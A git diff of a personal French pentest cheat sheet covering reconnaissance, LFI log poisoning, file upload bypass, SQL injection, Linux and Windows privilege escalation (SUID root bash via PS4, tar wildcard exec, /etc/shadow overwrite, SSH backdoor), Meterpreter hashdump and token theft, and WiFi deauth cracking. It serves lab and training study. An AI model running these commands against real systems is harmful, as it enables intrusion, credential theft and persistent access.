@@ -1,59 +1,40 @@
+___
 # Manuel de pentest 
 
 Le manuel suivant est personnel est établit dans le but d'avoir une ressource d'aide durant les tests d'intrusions effectués. 
 Toutes les opérations d'éthical hacking ont toujours été faites à but éducatif sur des environnements dédiés.
 
-## Informations en vrac :
+___
+# Informations en vrac :
 
-* Chemin des wordlist : `/usr/share/wor dlist`.
-* Liste des shells : `/usr/share/webshell`.
+* Chemin des wordlist : `/usr/share/wordlist`.
+* Liste des shells : 
+    1. (kali) `/usr/share/webshell`, 
+    2. http://pentestmonkey.net/
 * Liste des exploits exploitdb : `/usr/share/exploitdb/exploits`. 
-* Création de payload (reverse_shell, bind_shell,etc) : `msfvenom`
-* Upgrade un shell netcat : 
+
+* Identification d'un hash : 
+    1. (linux) `hash-identifier` : identifier un hash
+    2. https://gchq.github.io/CyberChef/ : identifier un hash (2)(voir Magic operation) 
+
+___
+# 01 : Reconnaissance / énumération.
+
+
+* `nmap -sV -a -p- -sS [ip]` : lister les ports, numéro de version, OS
 ```
-python -c 'import pty ; pty.spawn ("/bin/bash")'
-Ctrl + Z
-stty raw -echo
-fg
-export SHELL=bash
-export TERM=xterm-256color
-```
-* `hash-identifier` : identifier un hash
-* https://gchq.github.io/CyberChef/ : identifier un hash (2)(voir Magic operation )
-* Répertoire où tout le monde peut écrire : `/tmp/etc/var/tmp`
-* `wget [options] [url]` : permet de télécharger des fichiers, dossier du web
-hide
- Lien du site : `http://pentestmonkey.net/`. 
-* Pour ouvrir un dossier partagé sur un navigateur web : `python3 -m http.server`. 
-* Syntaxe de `kalimero ALL=(ALL:ALL) ALL tq A B(C:D) E` : 
-    ```
-    A : utilisateur. Préfixé par % (%A) : groupe A.
-    B : Nom de la machine 
-    C : Sous quelle identité ? ALL comprend root.
-    D : Sous quel groupe ? 
-    E : Commande à exécuter.
-    ```
-
-### SUDO
-
-* `sudo -l ` : lister les commandes autorisées et interdites par l'utilisateur courant.
-* `sudo -u toto [cmd]` : permet de lancer la commande [cmd] en tant que toto
-* `su - [user] ` : permet de se connecter en tant que user
-
-
-
-## 01 : Reconnaissance / énumération.
-
-* `nmap -sV -a -p- [ip]` : lister les ports, numéro de version, OS
 -sV : versions logicielles ;
 -a : all ;
 -p- lister tous les ports
+-sS force un scan rapide, pas freiné par le fw, discret (il ne finit pas les connexions TCP)
+-T4 : scan agressif afin de diminuer son délai
 
+```
 * `searchsploit [nom_service]` : chercher s'il existe des failles connues du service avec son numéro de version
 Sinon, sur un navigateur web : `exploitdb`
 
 
-### Service ouvert : web - 80
+## **Service ouvert : web - 80**
 
 * `nikto -h [url]` : scanner web
 
@@ -74,7 +55,7 @@ HTTPS Status Codes :
 
 </center>
 
-### Service ouvert : samba (linux) / smb (windows) - 139,445
+## **Service ouvert : samba (linux) / smb (windows) - 139,445**
 
 Samba est l'implémentation Unix du protocole SMB. <br>
 
@@ -84,21 +65,22 @@ Samba est l'implémentation Unix du protocole SMB. <br>
 * Pour télécharger le contenu d'un partage : `smbget -R //[ip]/[nom_du_partage]`
 * Pour se connecter en tant que user dans un groupe (le groupe n'est pas indispensable) : `smbclient -U GROUP/USER //[ip]` 
 
-### Service ouvert : RCPbind - 111
+## **Service ouvert : RPCbind - 111**
 
 * RPCbind : service qui agit comme un annuaire entre les services RPC et leur port d'écoute.
 * Utilisé pour lister les systèmes de fichiers qui sont montés par NFS : `nmap -p 111 --script = nfs-ls, nfs-showmount,nfs-statfs [ip]`.
 `rpcinfo -p [ip]` : liste tous les services RPC. 
 
-### Service ouvert : FTP - 21
+## **Service ouvert : FTP - 21**
 
 https://book.hacktricks.xyz/pentesting/pentesting-ftp
 
 
+___
+# **02 : Exploitation**
 
-## 02 : Exploitation
 
-### Reverse shell one line
+## **1) Reverse shell**
 
 * `nc -lvp [port]`
 * `pwncat -lp [port]` : https://github.com/calebstewart/pwncat 
@@ -106,8 +88,8 @@ https://book.hacktricks.xyz/pentesting/pentesting-ftp
 https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
-### Local/Remote File Inclusion (LFI / RFI)
-Cette attaque permet d’inclure un fichier sur un serveur web via un script php.
+## **2) Local/Remote File Inclusion (LFI / RFI)**
+
 Cette vulnérabilité survient lorsqu’une application web permet au client de soumettre des entrées dans des fichiers ou d’uploader des fichiers sur le serveur.
 
 * LFI : `http://pagevulnerable.com?page=page.php
@@ -115,7 +97,7 @@ Cette vulnérabilité survient lorsqu’une application web permet au client de 
 * RFI : `http://pagevulnerable.com?page=page.php
 =>http://pagevulnerable.com?page=http://google.com` 
 
-* Outil pour bruteforce une LFI/RFI* : `wfuzz` (bruteforce de paramètre get). 
+* Outil pour bruteforce une LFI/RFI : `wfuzz` (bruteforce de paramètre get). <br> 
 Exemple : `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://[ip]?get_param_name=FUZZ`.
 Ici on bruteforce le paramètre `get_param_name`.
 
@@ -123,34 +105,28 @@ Ici on bruteforce le paramètre `get_param_name`.
 * Sur linux, la racine d'un site web est `/var/www/html`.
 * On peut remonter autant de fois `../../../../` que l'on veut.
 * `%00` est le caractère nul de fin de chaîne en php
-* utilisation des wrappers (expect, input) tels que `pageweb.com/?view=php:expect//.......`
-
-* Sources : https://blog.clever-age.com/fr/tag/local-file-inclusion/
-* CheatSheet : https://highon.coffee/blog/lfi-cheat-sheet/ 
-_________
+* utilisation des wrappers (expect, input) tels que `pageweb.com/?
+view=php:expect//.......`
 
 **Log poisonning** : sur les serveurs apache, le fichier `/var/log/apache2/access.log` contient une liste de toutes les requêtes effectuées sur le serveur, dont le user-agent de celles-ci. Le but va d'être d'insérer un reverse shell dans ce user agent, qui sera exécuté lorsqu'on demandera d'afficher le fichier `access.log` grâce à la LFI. 
 Sous firefox : Inspect element -> network -> edit & resend -> dans les headers, sur la ligne du user agent : `<?php reverse_shell ?>`.
 
-___________
+* Sources : https://blog.clever-age.com/fr/tag/local-file-inclusion/
+* CheatSheet : https://highon.coffee/blog/lfi-cheat-sheet/ 
 
-*NB : LFI/RFI très rare depuis quelques temps, voire impossible*
+## **3) File upload**
+L'application permet à l'utilisateur d'upload un fichier sur leur serveur. 
 
-## File upload 
-
-Scénario : upload de fichier. On essaie d'upload du code php, normalement interdit.
-* Renommer l'extension (php3,php5, etc.)
-* Null byte 
-    1. bypass mime avec burpsuite
-    2. bypass extension `.png` => `.php%00.png`
-Voir : https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-using-burp-suite-0164148/
+Cheatsheet : 
+* https://github.com/pascal-sun/file-upload
+* https://book.hacktricks.xyz/pentesting-web/file-upload
 
 
-## Bruteforce
+## **4) Bruteforce**
 
 * `hydra -l user -P pass.txt [ip] [protocole] (si web : "/cheminlogin.php:[user_input_name]=^USER^[pass_input_name]=^PASS^:[message_login_fail]") ` : outil de bruteforce (ssh,http,ftp,smb...)
 
-## Injection SQL 
+## **5) Injection SQL**
 
 Une injection SQL pose 4 types de problème : 
 1. Confidentialité : accès à des données sensibles.
@@ -165,7 +141,7 @@ Il existe plusieurs type de serveurs SQL :
 
 Les injections SQL peuvent être classifiée en 3 catégories : 
 
-### 1) **Injection in-band**
+### **1) Injection in-band**
 
 Le plus commun et facile à exploiter : l'attaquant utilise le même canal pour lancer l'attaque et recueillir les résultats.
 
@@ -200,7 +176,7 @@ Le plus commun et facile à exploiter : l'attaquant utilise le même canal pour 
 
 * https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/Error%20Based%20SQLi/README.md 
 
-### 2) **Injection inférentielle (blind)** 
+### **2) Injection inférentielle (blind)** 
 
 Aucune donnée n'est transférée entre le serveur et le client, et le client n'a aucun moyen de voir le résultat de sa requête. Ainsi, l'attaquant est capable de recueillir des informations en envoyant son payload et en analysant le comportement du serveur.
 
@@ -208,7 +184,7 @@ Aucune donnée n'est transférée entre le serveur et le client, et le client n'
 
 4. Injection SQL **BOOLEAN-BASED (CONTENT-BASED)** : repose sur l'envoie d'une requête qui oblige l'application à renvoyer un résultat différent si le résultat de cette requête est vraie ou faux.
 
-### 3) **Injection out-band** 
+### **3) Injection out-band** 
 
 Plutôt rare car cela dépend des fonctionnalités activées de la bdd utilisées par l'application web. L'attaquant n'utilise pas le même canal pour lancer l'attaque et recueillir les résultats. 
 
@@ -223,24 +199,39 @@ Ressources :
 * https://owasp.org/www-community/attacks/SQL_Injection
 * https://www.acunetix.com/websitesecurity/sql-injection2/
 
-## 03 : Privilege escalation
+## **Injection template Java**
 
-**SUDO, CRON, PROCESS, SUID** 
+Explication : 
+* https://portswigger.net/research/server-side-template-injection
+
+Cheatsheet :
+* https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#freemarker
+
+___
+# 03.1 : Privilege escalation - LINUX 
+
+**SUDO, CRON, PROCESSUS, SUID** 
+
+## **1) Sudo**
+
+* `sudo -l ` : lister les commandes autorisées et interdites par l'utilisateur courant.
+* `sudo -u toto [cmd]` : permet de lancer la commande [cmd] en tant que toto
+* `su - [user] ` : permet de se connecter en tant que user
+
+## **2) Cron**
 
 * Crontab : **CRON** est un programme qui permet d'exécuter automatiquement des scripts
     1. `crontab -l` pour lister les crontab du user en cours.
     2. `cat /etc/crontab`
 
+## **3) Processus**
+
 * `ps -aux` : lister les processus courant pour repérer si des process ont été lancés avec root par exemple.
+
+## **4) SUID/SGID**
 
 * GTFOBins : liste d'exécutable linux pouvant être exploité.
 Lien du site : `https://gtfobins.github.io/`.
-* Scripts PEAS : `https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite`.
-
-* Si `/etc/shadow` est autorisé en écriture : `mkpasswd -m sha-512 [new_root_password]` => insérer le résultat dans la deuxième colonne de `/etc/shadow`
-* Si `/etc/passwd` est autorisé en écriture : `openssl passwd [new_root_passord]` => insérer le résultat dans la deuxième colonne de `/etc/passwd`
-
-### SUID/SGID
 
 Fichiers qui s'exécutent avec les droits root.
 
@@ -291,8 +282,13 @@ fonction bash avec le nom absolu de l'exécutable.
 * Abusing shell features (2) : Version de bash inférieure à 4.4. Mode débugage avec la variable d'env. PS4 sur un fichier foo.
 `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' foo` 
 
-### NFS (Network File System)
+## **Scripts automatisés**
 
+* Scripts PEAS : https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS.
+* Script kernel : https://github.com/jondonas/linux-exploit-suggester-2
+
+## **NFS (Network File System)**
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 * Définition : Protocole qui permet à un ordinateur d'accéder à des fichiers sur une machine distante.
 Monter un NFS sur sa machine permet à d'autres utilisateurs d'accéder au FS (fichiers) de cette machine.
 Pour voir les informations d'un serveur nfs : `showmount -e [ip]`
@@ -312,15 +308,12 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-### Kernel exploit 
-
-* Script qui énumère les kernels exploit possible parmi une grande liste : 
-https://github.com/jondonas/linux-exploit-suggester-2
+## **Kernel exploit**
 
 * Dirtycow est une vulnérabilité du noyau linux.
 Lien git : `https://github.com/dirtycow/dirtycow.github.io`.
 
-### Variables d'environnements
+## **Variables d'environnements**
 
 `sudo -l` affiche la liste des variables d'environnements sur la première ligne.
 
@@ -332,11 +325,11 @@ https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
 https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
 
 
-### Escape from Docker
+## **Escape from Docker**
 
 * Docker container escape privesc : https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
 
-### Wildcard (*) exploitation
+## **Wildcard (*) exploitation**
 
 Si une commande est exécutée avec `*` comme paramètre => exploitable.
 Création de fichier correspondant aux paramètres de la commande exploitable.
@@ -344,7 +337,7 @@ Exemple : `tar [archive.tar.gz] *`
 => `tar [archive.tar.gz] --checkpoint=1 --checkpoint-action=exec=shell.elf`
 
 
-### John the Ripper
+## **John the Ripper**
 * Si les fichiers /etc/password et /etc/shadow sont readable : 
     ```
     unshadow password.txt shadow.txt > passwords.txt
@@ -352,22 +345,7 @@ Exemple : `tar [archive.tar.gz] *`
     john --show passwords.txt
     ```
 
-### Rare mais pas impossible
-
-1. Le mot de passe de la session pourrait être contenu dans : 
-    * Un fichier de configuration `/etc/..`
-    * L'historique des commandes `cat ~/.*history`
-
-2. Il est possible que la clé id_rsa du root dans `/root/.ssh` soit en lecture.
-
-
-Documentation THM : https://tryhackme.com/room/linuxprivesc
-___________________
-___________________
-___________________
-___________________
-
-### SSH backdoor 
+## **SSH backdoor**
 
 Sur la machine cible : 
 * ssh-keygen
@@ -380,7 +358,84 @@ OU
 
 Ajouter notre clé publique root au fichier authorized_keys de la machine cible 
 
+Documentation THM : https://tryhackme.com/room/linuxprivesc
 
+## **Autres**
+
+* Si `/etc/shadow` est autorisé en écriture : `mkpasswd -m sha-512 [new_root_password]` => insérer le résultat dans la deuxième colonne de `/etc/shadow`
+* Si `/etc/passwd` est autorisé en écriture : `openssl passwd [new_root_passord]` => insérer le résultat dans la deuxième colonne de `/etc/passwd`
+* Le mot de passe de la session pourrait être contenu dans : 
+    1. Un fichier de configuration `/etc/..`
+    2. L'historique des commandes `cat ~/.*history`
+
+* Il est possible que la clé id_rsa du root dans `/root/.ssh` soit en lecture.
+
+___
+# 03.2 : Privilege escalation - WINDOWS 
+
+
+## **Commandes utiles**
+
+* `sysinfo` : infos système (voir hotfix)
+* `net user` : liste des utilisateurs 
+* `whoami /priv` : privilèges de l'utilisateur (défaut : vagrant)
+* `whoami /groups` : groupes de l'utilisateur (défaut : everyone)
+* `whoami /all` : toutes les infos de l'utilisateur
+* `hostname` : nom de l'ordinateur
+* `tasklist` : liste des processus
+
+
+## **METASPLOIT**
+
+### **1) MSFConsole**
+* `msfconsole` : run
+* `search [service]`: chercher vulns d'un service
+* Configuration : 
+```
+use exploit [exploit] (pour une vulnérabilité précise)
+set payload [payload]
+set RHOSTS [ip cible] 
+set RPORT [port cible]
+run
+```
+* Liste des exploits favoris : 
+    1. ms08_067_netapi
+* `show options` : affiche les options
+* `sessions` : affiche les sessions
+* `set SESSION 1` : affecte les paramètres courant à la session 1
+
+
+### **2) Meterpreter**
+
+* `sysinfo` : infos système
+* `getuid` : info user courant
+* `upload [chemin_fichier_sur_linux]`
+* `getprivs` : privilèges 
+* `shell` : shell
+* `hashdump` : équivalent à /etc/shadow
+* Module meterpreter d'usurpation de token : 
+```
+use incognito : charge le module
+help : aide
+list_tokens -u : liste les tokens
+impersonate_token (/!\ 2 backslashes) : vol de token
+
+```
+
+### **3) Vulnérabilités connues**
+
+* `MS16-032` : attaque d'usurpation de token
+* `MS16-075 -> rottenpotteto.exe` : générer le token admin
+
+## **Scripts automatisés**
+
+* Script PEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS 
+* Enum4Linux : https://github.com/cddmp/enum4linux-ng 
+<br> *A lancer sur kali.*
+* Script exploit suggester : https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+<br> *A lancer sur kali.*
+
+___
 # Bruteforce de réseau wifi
 
 Le **mode moniteur** permet à un ordinateur équipé d'une carte réseau Wi-Fi d'écouter tout le trafic d'un réseau sans fil. À la différence du mode promiscuous, qui est aussi utilisé pour sniffer un réseau, le mode moniteur permet aux paquets d'être capturés sans avoir besoin de s'enregistrer sur un point d'accès (AP) ou réseau ad hoc. Le mode moniteur n'existe que sur les réseaux sans fil, tandis que le mode promiscuous peut être utilisé à la fois sur les réseaux filaires et sans fil. 
@@ -392,7 +447,8 @@ Le **mode moniteur** permet à un ordinateur équipé d'une carte réseau Wi-Fi 
 * déconnecter un hôte pour récupérer handshake : `aireplay-ng -0 1 -a [bssid_ap] -c [bssid_hôte] wlan0`
 * bruteforce du fichier de handshake : `crunch [min] [max] [caractères_testés] | aircrack-ng -w- -b  [bssid_ap] *.cap`
 
-**Autre moyen :** utiliser `fern` sur kali linux
+**Autre moyen :** utiliser `fern` sur kali linux, etthercap ?
+___
 
 # Sténographie
 
@@ -411,21 +467,7 @@ Pour afficher une image : `eog [img]`
 
 Sources : https://0xrick.github.io/lists/stego/
 
-# Attaque machines windows
-
-## 01 : Reconnaissance 
-
-* Script perl d'énumération : `./enum4linux.pl`
-
-# OSI 
-
-![OSI](./ressources/osi.png)
-
-
-# VRAC
-
-* site qui recense des log/pass leakés pour ne pas avoir à se créer de compte: http://bugmenot.com/ 
-
+___
 # Outils les plus utilisés Kali linux 
 
 * `nmap` : analyse d'un hôte 
